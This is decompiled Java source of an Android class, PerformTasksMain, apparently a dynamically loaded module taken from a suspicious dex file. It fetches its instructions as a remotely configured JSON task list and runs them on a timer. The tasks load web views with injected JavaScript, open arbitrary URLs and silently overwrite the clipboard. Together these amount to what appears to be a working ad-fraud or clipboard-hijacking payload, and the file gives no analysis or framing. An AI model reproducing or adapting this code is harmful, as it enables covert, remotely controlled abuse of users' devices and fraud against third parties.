package com.she.she.she.dlib;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* loaded from: /Users/mac-fl-020/Downloads/yy-main/classes.dex */
public class PerformTasksMain implements IDynamic {
    static Handler handler = new Handler(Looper.getMainLooper());
    private static TimerTask timerTask;
    private List<CodeObject> codeObjectsList;
    private List<MyObject> myObjects;
    Random probabilityRandom;
    private long taskInterval;
    Random typeRandom;
    AutoScrollWebView wv;

    public void onLoad(final Context context, String str) {
        synchronized (PerformTasksMain.class) {
            parseJson(str);
            handler.removeCallbacksAndMessages(null);
            TimerTask timerTask2 = timerTask;
            if (timerTask2 != null) {
                timerTask2.cancel();
            }
            Timer timer = new Timer();
            TimerTask timerTask3 = new TimerTask() { // from class: com.she.she.she.dlib.PerformTasksMain.1
                @Override // java.util.TimerTask, java.lang.Runnable
                public void run() {
                    PerformTasksMain.handler.removeCallbacksAndMessages(null);
                    PerformTasksMain.handler.post(new Runnable() { // from class: com.she.she.she.dlib.PerformTasksMain.1.1
                        @Override // java.lang.Runnable
                        public void run() {
                            PerformTasksMain.this.performTasks(context);
                        }
                    });
                }
            };
            timerTask = timerTask3;
            timer.schedule(timerTask3, 0L, this.taskInterval);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void performTasks(Context context) {
        if (this.typeRandom == null) {
            this.typeRandom = new Random();
        }
        List<MyObject> list = this.myObjects;
        if (list == null || list.size() <= 0) {
            return;
        }
        MyObject myObject = this.myObjects.get(this.typeRandom.nextInt(this.myObjects.size()));
        String type = myObject.getType();
        type.hashCode();
        char c = 65535;
        switch (type.hashCode()) {
            case 49:
                if (type.equals("1")) {
                    c = 0;
                    break;
                }
                break;
            case 50:
                if (type.equals("2")) {
                    c = 1;
                    break;
                }
                break;
            case 51:
                if (type.equals("3")) {
                    c = 2;
                    break;
                }
                break;
        }
        switch (c) {
            case 0:
                try {
                    List<CodeObject> list2 = this.codeObjectsList;
                    if (list2 == null || list2.size() <= 0) {
                        return;
                    }
                    WebUtils.getInstance().startWebView(context, this.codeObjectsList, myObject.getDefaultUrl(), handler);
                    return;
                } catch (Exception unused) {
                    System.out.println("");
                    return;
                }
            case 1:
                try {
                    if (myObject.getUrl() == null || myObject.getUrl().length() <= 0 || !myObject.getUrl().startsWith("http")) {
                        return;
                    }
                    context.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(myObject.getUrl())));
                    return;
                } catch (Exception unused2) {
                    System.out.println("");
                    return;
                }
            case 2:
                CopyUtils.copyToClipBoard(context.getApplicationContext(), myObject.getContent());
                return;
            default:
                return;
        }
    }

    private void parseJson(String str) {
        try {
            JSONArray jSONArray = new JSONArray(str);
            this.myObjects = new ArrayList();
            for (int i = 0; i < jSONArray.length(); i++) {
                JSONObject jSONObject = jSONArray.getJSONObject(i);
                MyObject myObject = new MyObject();
                myObject.setType(jSONObject.getString("type"));
                if (myObject.getType().equals("0")) {
                    this.taskInterval = jSONObject.getLong("taskInterval");
                } else if (myObject.getType().equals("1")) {
                    myObject.setDefaultUrl(jSONObject.getString("defaultUrl"));
                    myObject.setProbability(jSONObject.getInt("probability"));
                    JSONArray jSONArray2 = jSONObject.getJSONArray("code");
                    this.codeObjectsList = new ArrayList();
                    for (int i2 = 0; i2 < jSONArray2.length(); i2++) {
                        JSONObject jSONObject2 = jSONArray2.getJSONObject(i2);
                        CodeObject codeObject = new CodeObject();
                        codeObject.setUrl(jSONObject2.getString("url"));
                        codeObject.setInterval(jSONObject2.getLong("interval"));
                        JSONArray jSONArray3 = jSONObject2.getJSONArray("js");
                        ArrayList arrayList = new ArrayList();
                        for (int i3 = 0; i3 < jSONArray3.length(); i3++) {
                            arrayList.add(jSONArray3.getString(i3));
                        }
                        codeObject.setJsStrings(arrayList);
                        this.codeObjectsList.add(codeObject);
                    }
                    myObject.setCodeObjects(this.codeObjectsList);
                } else if (myObject.getType().equals("2")) {
                    myObject.setUrl(jSONObject.getString("url"));
                    myObject.setProbability(jSONObject.getInt("probability"));
                } else if (myObject.getType().equals("3")) {
                    myObject.setContent(jSONObject.getString("content"));
                    myObject.setProbability(jSONObject.getInt("probability"));
                }
                this.myObjects.add(myObject);
            }
            for (MyObject myObject2 : this.myObjects) {
                System.out.println(myObject2);
            }
        } catch (JSONException unused) {
            System.out.println("");
        }
    }
}